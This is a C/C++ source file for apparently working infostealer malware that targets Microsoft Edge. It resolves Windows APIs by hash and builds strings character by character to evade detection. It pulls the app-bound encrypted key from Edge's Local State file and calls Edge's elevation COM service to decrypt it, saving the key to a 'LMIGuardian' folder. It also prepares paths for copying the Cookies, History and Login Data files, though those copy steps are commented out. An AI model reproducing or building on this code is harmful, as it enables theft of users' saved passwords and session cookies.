#include "apilex.h"
#include "../../../Sable/CRT/CRT/CRT.h"

#include "Common.h"

typedef enum _PROTECTION_LEVEL
{
    PROTECTION_NONE = 0,
    PROTECTION_PATH_VALIDATION_OLD = 1,
    PROTECTION_PATH_VALIDATION = 2,
    PROTECTION_MAX = 3

} PROTECTION_LEVEL;

typedef struct IElevatorEdge IElevatorEdge;

typedef struct IElevatorEdgeVtbl
{
    // IUnknown (vtable slots 0-2)
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IElevatorEdge* This, REFIID riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(IElevatorEdge* This);
    ULONG(STDMETHODCALLTYPE* Release)(IElevatorEdge* This);

    // Edge base interface placeholders (vtable slots 3-5)
    HRESULT(STDMETHODCALLTYPE* _Placeholder1)(IElevatorEdge* This);
    HRESULT(STDMETHODCALLTYPE* _Placeholder2)(IElevatorEdge* This);
    HRESULT(STDMETHODCALLTYPE* _Placeholder3)(IElevatorEdge* This);

    // IElevator methods (vtable slots 6-8)
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(
        IElevatorEdge* This,
        const WCHAR* crx_path,
        const WCHAR* browser_appid,
        const WCHAR* browser_version,
        const WCHAR* session_id,
        DWORD           caller_proc_id,
        ULONG_PTR* proc_handle
        );

    HRESULT(STDMETHODCALLTYPE* EncryptData)(
        IElevatorEdge* This,
        PROTECTION_LEVEL    protection_level,
        const BSTR          plaintext,
        BSTR* ciphertext,
        DWORD* last_error
        );

    HRESULT(STDMETHODCALLTYPE* DecryptData)(
        IElevatorEdge* This,
        const BSTR      ciphertext,
        BSTR* plaintext,
        DWORD* last_error
        );

} IElevatorEdgeVtbl;

struct IElevatorEdge
{
    IElevatorEdgeVtbl* lpVtbl;
};

#define SystemExtendedHandleInformation 64

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX;

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO {
    HANDLE HandleValue;
    ULONG_PTR HandleCount;
    ULONG_PTR PointerCount;
    ULONG GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION;

typedef struct tagPROCESSENTRY32W
{
    DWORD   dwSize;
    DWORD   cntUsage;
    DWORD   th32ProcessID;          // this process
    ULONG_PTR th32DefaultHeapID;
    DWORD   th32ModuleID;           // associated exe
    DWORD   cntThreads;
    DWORD   th32ParentProcessID;    // this process's parent process
    LONG    pcPriClassBase;         // Base priority of process's threads
    DWORD   dwFlags;
    WCHAR   szExeFile[MAX_PATH];    // Path
} PROCESSENTRY32W;
typedef PROCESSENTRY32W* PPROCESSENTRY32W;
typedef PROCESSENTRY32W* LPPROCESSENTRY32W;

#define TH32CS_SNAPPROCESS  0x00000002
#define ProcessHandleInformation 51
#define ObjectTypeInformation 2
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004)
#define STATUS_BUFFER_TOO_SMALL    ((NTSTATUS)0xC0000023)



int main() {
    ApiResolve apiResolve{};
    LPVOID lpKernel32 = apiResolve.GetModuleBaseAddress(hashKernel32);
    _LoadLibraryA pLoadLibraryA = (_LoadLibraryA)apiResolve.GetApiAddress(lpKernel32, hashLoadLibraryA);
    const char* sOle32 = "ole32.dll";
    LPVOID lpOle32 = pLoadLibraryA(sOle32);
    const char* sOleaut32 = "oleaut32.dll";
    LPVOID lpOleaut32 = pLoadLibraryA(sOleaut32);
    const char* sShell32 = "shell32.dll";
    LPVOID lpShell32 = pLoadLibraryA(sShell32);
    _CloseHandle pCloseHandle = (_CloseHandle)apiResolve.GetApiAddress(lpKernel32, hashCloseHandle);
    _CoCreateInstance pCoCreateInstance = (_CoCreateInstance)apiResolve.GetApiAddress(lpOle32, hashCoCreateInstance);
    _CoInitializeEx pCoInitializeEx = (_CoInitializeEx)apiResolve.GetApiAddress(lpOle32, hashCoInitializeEx);
    _CoSetProxyBlanket pCoSetProxyBlanket = (_CoSetProxyBlanket)apiResolve.GetApiAddress(lpOle32, hashCoSetProxyBlanket);
    _CoUninitialize pCoUninitialize = (_CoUninitialize)apiResolve.GetApiAddress(lpOle32, hashCoUninitialize);
    _CreateFileA pCreateFileA = (_CreateFileA)apiResolve.GetApiAddress(lpKernel32, hashCreateFileA);
    _ExitThread pExitThread = (_ExitThread)apiResolve.GetApiAddress(lpKernel32, hashExitThread);
    _GetFileSize pGetFileSize = (_GetFileSize)apiResolve.GetApiAddress(lpKernel32, hashGetFileSize);
    _ReadFile pReadFile = (_ReadFile)apiResolve.GetApiAddress(lpKernel32, hashReadFile);
    _SHGetFolderPathA pSHGetFolderPathA = (_SHGetFolderPathA)apiResolve.GetApiAddress(lpShell32, hashSHGetFolderPathA);
    _SysAllocStringByteLen pSysAllocStringByteLen = (_SysAllocStringByteLen)apiResolve.GetApiAddress(lpOleaut32, hashSysAllocStringByteLen);
    _SysFreeString pSysFreeString = (_SysFreeString)apiResolve.GetApiAddress(lpOleaut32, hashSysFreeString);
    _SysStringByteLen pSysStringByteLen = (_SysStringByteLen)apiResolve.GetApiAddress(lpOleaut32, hashSysStringByteLen);
    _WriteFile pWriteFile = (_WriteFile)apiResolve.GetApiAddress(lpKernel32, hashWriteFile);
    const char* logpath = "C:\\Users\\vuong\\log.txt";
    WriteMessageToFile(logpath, "start");
    CLSID EdgeCLSID = { 0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67} };
    IID EdgeIID = { 0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B} };
    IElevatorEdge* pElevatorEdge = NULL;
    HRESULT hr;
    typedef HRESULT(WINAPI* _SHGetFolderPathA)(
        HWND   hwnd,
        int    csidl,
        HANDLE hToken,
        DWORD  dwFlags,
        LPSTR  pszPath
        );

    char path[MAX_PATH] = { 0 };
    if (pSHGetFolderPathA(NULL, 0x001c, NULL, 0, path) != S_OK) {
        return 1;
    }

    char pathEdge[MAX_PATH] = { 0 };
    crt_memcpy(pathEdge, path, MAX_PATH);
    char sSubEdge[] = {
        '\\','M','i','c','r','o','s','o','f','t','\\',
        'E','d','g','e','\\',
        'U','s','e','r',' ','D','a','t','a', '\\',
        'D', 'e', 'f', 'a', 'u', 'l', 't',
        '\0'
    };

    crt_memcpy(pathEdge + crt_strlen(pathEdge), sSubEdge, MAX_PATH - crt_strlen(pathEdge));

    char sLocalState[] = {
        '\\','M','i','c','r','o','s','o','f','t','\\',
        'E','d','g','e','\\',
        'U','s','e','r',' ','D','a','t','a','\\',
        'L','o','c','a','l',' ','S','t','a','t','e',
        '\0'
    };
    int size = crt_strlen(path);
    crt_memcpy(path + crt_strlen(path), sLocalState, MAX_PATH - crt_strlen(path));

    char pathMal[MAX_PATH] = { 0 };
    if (pSHGetFolderPathA(NULL, 0x001a, NULL, 0, pathMal)) {
        return 1;
    }
    char sMal[] = {
        '\\', 'L', 'M', 'I', 'G', 'u', 'a', 'r', 'd', 'i', 'a', 'n', '\0'
    };

    char keyPath[MAX_PATH] = { 0 };
    char cookiesPath[MAX_PATH] = { 0 };
    char historyPath[MAX_PATH] = { 0 };
    char passwordPath[MAX_PATH] = { 0 };

    crt_memcpy(pathMal + crt_strlen(pathMal), sMal, MAX_PATH - crt_strlen(sMal));

    crt_memcpy(keyPath, pathMal, MAX_PATH);
    char keyFileName[] = { '\\', 'b', 'r', 'o', 'w', 's', 'e', 'r', 'k', 'e', 'y', '.', 'd', 'b', '\0' };
    crt_memcpy(keyPath + crt_strlen(keyPath), keyFileName, MAX_PATH - crt_strlen(keyPath));

    crt_memcpy(cookiesPath, pathMal, MAX_PATH);
    crt_memcpy(historyPath, pathMal, MAX_PATH);
    crt_memcpy(passwordPath, pathMal, MAX_PATH);
    char historyFilename[] = { '\\', 'H', 'i', 's', 't', 'o', 'r', 'y', '\0' };
    char cookiesFilename[] = { '\\', 'C', 'o', 'o', 'k', 'i', 'e', 's', '\0' };
    char passwordFilename[] = { '\\', 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a', '\0' };

    crt_memcpy(cookiesPath + crt_strlen(cookiesPath), cookiesFilename, MAX_PATH - crt_strlen(cookiesPath));
    crt_memcpy(historyPath + crt_strlen(historyPath), historyFilename, MAX_PATH - crt_strlen(historyPath));
    crt_memcpy(passwordPath + crt_strlen(passwordPath), passwordFilename, MAX_PATH - crt_strlen(passwordPath));

    char orCookiesPath[MAX_PATH] = { 0 };
    char orHistoryPath[MAX_PATH] = { 0 };
    char orPasswordPath[MAX_PATH] = { 0 };
    crt_memcpy(orCookiesPath, pathEdge, MAX_PATH);
    crt_memcpy(orHistoryPath, pathEdge, MAX_PATH);
    crt_memcpy(orPasswordPath, pathEdge, MAX_PATH);

    char network[] = { '\\', 'N', 'e', 't', 'w', 'o', 'r', 'k', '\0' };

    crt_memcpy(orCookiesPath + crt_strlen(orCookiesPath), network, MAX_PATH - crt_strlen(orCookiesPath));
    crt_memcpy(orCookiesPath + crt_strlen(orCookiesPath), cookiesFilename, MAX_PATH - crt_strlen(orCookiesPath));
    crt_memcpy(orHistoryPath + crt_strlen(orHistoryPath), historyFilename, MAX_PATH - crt_strlen(orHistoryPath));
    crt_memcpy(orPasswordPath + crt_strlen(orPasswordPath), passwordFilename, MAX_PATH - crt_strlen(orPasswordPath));

    typedef HANDLE(WINAPI* _CreateFileA)(
        LPCSTR                lpFileName,
        DWORD                 dwDesiredAccess,
        DWORD                 dwShareMode,
        LPSECURITY_ATTRIBUTES lpSecurityAttributes,
        DWORD                 dwCreationDisposition,
        DWORD                 dwFlagsAndAttributes,
        HANDLE                hTemplateFile
        );
    WriteMessageToFile(logpath, path);
    HANDLE hFile = pCreateFileA((LPCSTR)path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hFile) { return 1; }

    if (!pGetFileSize) { return 1; }
    DWORD dwFileSize = pGetFileSize(hFile, NULL);
    if (dwFileSize == 0) { return 1; }

    LPVOID fileBuf = crt_malloc(dwFileSize + 1);
    if (!fileBuf) {
        return 1;
    }

    if (!pReadFile(hFile, fileBuf, dwFileSize, NULL, NULL)) {
        return 1;
    }

    pCloseHandle(hFile);
    char patternKey[] = { 'a', 'p', 'p', '_', 'b', 'o', 'u', 'n', 'd', '_', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'e', 'd', '_', 'k', 'e', 'y', '"', ':', '"', '\0' };
    char* keyPointer = crt_strstr((char*)fileBuf, patternKey);
    if (!keyPointer) { return 1; }
    keyPointer = keyPointer + crt_strlen(patternKey);
    int sizeKeyB64 = 0;
    for (int i = 0; ; i++) {
        if (keyPointer[i] == '"') {
            keyPointer[i] = '\0';
            break;
        }
        i++;
        sizeKeyB64++;
    }

    typedef HRESULT(WINAPI* _CoInitializeEx)(
        LPVOID pvReserved,
        DWORD  dwCoInit
        );

    hr = pCoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        return 1;
    }

    hr = pCoCreateInstance(
        EdgeCLSID,
        nullptr,
        CLSCTX_LOCAL_SERVER,
        EdgeIID,
        reinterpret_cast<void**>(&pElevatorEdge)
    );

    if (FAILED(hr)) {
        pCoUninitialize();
        return 1;
    }

    typedef HRESULT(WINAPI* _CoSetProxyBlanket)(
        IUnknown* pProxy,
        DWORD                    dwAuthnSvc,
        DWORD                    dwAuthzSvc,
        OLECHAR* pServerPrincName,
        DWORD                    dwAuthnLevel,
        DWORD                    dwImpLevel,
        RPC_AUTH_IDENTITY_HANDLE pAuthInfo,
        DWORD                    dwCapabilities
        );


    hr = pCoSetProxyBlanket(
        (IUnknown*)pElevatorEdge,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_DYNAMIC_CLOAKING
    );

    BSTR decryptedDataBSTR = NULL;
    DWORD dwLastError = 0;
    int length = 0;
    char* encKey = Base64Decode(keyPointer, length);


    BSTR bstrEncKey = pSysAllocStringByteLen(encKey + 4, length - 4);
    hr = pElevatorEdge->lpVtbl->DecryptData(pElevatorEdge, bstrEncKey, &decryptedDataBSTR, &dwLastError);
    if (bstrEncKey) {
        pSysFreeString(bstrEncKey);
    }

    if (FAILED(hr)) {
        return 1;
    }
    else {
        typedef BOOL(WINAPI* _WriteFile)(
            HANDLE       hFile,
            LPCVOID      lpBuffer,
            DWORD        nNumberOfBytesToWrite,
            LPDWORD      lpNumberOfBytesWritten,
            LPOVERLAPPED lpOverlapped
            );
        //Write key to file in desktop
        //char keyFileName[] = { 'b', 'r', 'o', 'w', 's', 'e', 'r', 'k', 'e', 'y', '\0' };
        //memcpy(keyFileName, pathMal + strlen(pathMal), MAX_PATH - strlen(pathMal));
        HANDLE hFile = pCreateFileA(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        pWriteFile(hFile, decryptedDataBSTR, pSysStringByteLen(decryptedDataBSTR), NULL, NULL);

        //CreateCopyFile(cookiesFilename, cookiesPath);
        //CreateCopyFile(historyFilename, historyPath);
        //CreateCopyFile(passwordFilename, passwordPath);

        //if (CreateCopyFile(orCookiesPath, cookiesPath)) {
        //    for (int i = 0; i < 1000; i++) {
        //        if (pCopyFileA(orCookiesPath, cookiesPath, FALSE)) {
        //            break;
        //        }
        //    }

        //    if (!pCopyFileA(orHistoryPath, historyPath, FALSE)) {

        //    }

        //    if (pCopyFileA(orPasswordPath, passwordPath, FALSE)) {

        //    }
        //}

        //if (!pCopyFileA(orCookiesPath, cookiesPath, FALSE)) {
        //    //CreateCopyFile(cookiesFilename, cookiesPath);
        //}



        //CreateCopyFile(historyFilename, historyPath);
        //CreateCopyFile(cookiesFilename, cookiesPath);
        //CreateCopyFile(passwordFilename, passwordPath);

        pSysFreeString(decryptedDataBSTR);
        pCloseHandle(hFile);
    }

    crt_free(fileBuf);
    //constexpr unsigned int hashExitThread = ComplexHashForAnsi("ExitThread");
    //typedef VOID(WINAPI* _ExitThread)(DWORD);
    //_ExitThread pExitThread = (_ExitThread)apiResolve.GetApiAddress(lpKernel32, hashExitThread);
    //pExitThread(0);
    pExitThread(0);
}